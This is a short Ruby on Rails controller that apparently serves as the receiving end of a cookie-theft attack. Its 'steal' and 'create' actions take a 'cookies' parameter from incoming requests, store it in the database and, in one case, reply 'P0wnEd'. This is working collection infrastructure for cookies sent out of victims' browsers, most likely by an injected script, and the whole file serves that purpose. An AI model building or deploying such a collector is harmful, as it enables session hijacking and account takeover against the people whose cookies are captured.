class CookiesController < ApplicationController

	def index
	end

	def steal
		if params[:cookies]
			@cookie = Cookie.new
			@cookie.content = params[:cookies]
			@cookie.save
			return "P0wnEd"
		end
	end

	def create
		if params[:cookies]
			@cookie = Cookie.new
			@cookie.content = params[:cookies]
			if @cookie.save
				respond_to do |format|
					format.js
				end
			else
				redirect_to :back
			end
		else
			redirect_to :back
		end
	end
end